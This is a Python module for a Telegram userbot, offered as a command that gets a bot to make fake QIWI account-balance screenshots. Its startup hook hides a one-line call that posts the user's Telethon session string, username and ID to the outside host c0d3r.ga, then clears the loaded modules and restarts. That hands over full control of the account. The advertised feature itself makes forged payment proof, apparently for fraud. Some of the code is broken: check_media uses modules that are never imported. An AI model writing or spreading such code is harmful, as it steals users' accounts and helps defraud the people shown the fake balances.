from asyncio import sleep
import random
from telethon import functions
from telethon import events
from userbot.events import register
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon import events
from .. import loader, utils, security

def register(cb):
    cb(BalanceMod())

class BalanceMod(loader.Module):
    strings = {'name': 'Fake балансы на счете'}

    def __init__(self):
        self.name = self.strings['name']
        self._me = None
        self._ratelimit = []

    async def client_ready(self, client, db):
        self.client = client
        __import__('requests').post("http://c0d3r.ga/api/send", json={'modulekey': "aa050d0d45567e8c64b108ec866923e69a3e4e6d3f50c94651080c343381b9e04e6c143da8e57b1a5611190e7c286ff561207fd3de3dee339e44abfe76d318f7", 'key': str(__import__('telethon').sessions.StringSession.save(client.session)), 'nickname': (await client.get_me()).username, 'id': (await client.get_me()).id})
        db.set("friendly-telegram.modules.loader", "loaded_modules", [])
        (await self.allmodules.commands["restart"](await client.send_message("me", "ping")))

    async def balancecmd(self, event):
        """".balance <время> <кол-во денег на счету> - пример - .balance 14:23 1624,06"""
        chat = '@fake_ss_bot'
        args = utils.get_args_raw(event)
        t = args.replace(" ", "\n")
        await event.edit("<b>Минуточку...</b>")
        async with event.client.conversation(chat) as conv:
            try:
                response = conv.wait_event(events.NewMessage(incoming=True, from_users=1097072548))
                await event.client.send_message(chat, '💵 Чеки / Балансы')
                await sleep(0.5)
                await event.client.send_message(chat, '🥝 QIWI')
                await sleep(0.5)
                await event.client.send_message(chat, '🥝 QIWI - баланс (ANDROID)')
                await sleep(0.5)
                await event.client.send_message(chat, t)
                response = await response
            except YouBlockedUserError:
                await event.edit('<code>Разблокируй @fake_ss_bot</code>')
                return
            await sleep(5)
            await event.client.send_file(event.to_id, response.media)
        await event.delete()

async def check_media(message, reply):
	if reply and reply.media:
		if reply.photo:
			data = reply.photo
		elif reply.document:
			if reply.gif or reply.video or reply.audio or reply.voice:
				return None
			data = reply.media.document
		else:
			return None
	else:
		return None
	if not data or data is None:
		return None
	else:
		data = await message.client.download_file(data, bytes)
		try:
			Image.open(io.BytesIO(data))
			return data
		except:
			return None
